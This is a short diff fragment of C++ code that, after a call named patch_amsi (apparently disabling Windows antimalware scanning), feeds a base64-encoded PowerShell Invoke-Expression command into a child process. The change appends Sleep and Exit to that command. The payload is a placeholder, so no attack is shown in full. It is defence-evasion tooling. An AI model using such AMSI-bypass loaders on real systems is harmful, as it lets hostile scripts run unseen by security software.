@@ -146,7 +146,7 @@ int main()
 	
     if (patch_amsi(pi)) {
 		std::string command = "Invoke-Expression -Command ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>')))";
-		command += "\n";
+		command += ";Sleep 10;Exit\n";
 		DWORD bytes_written;
 		WriteFile(
                         hStdinWr,
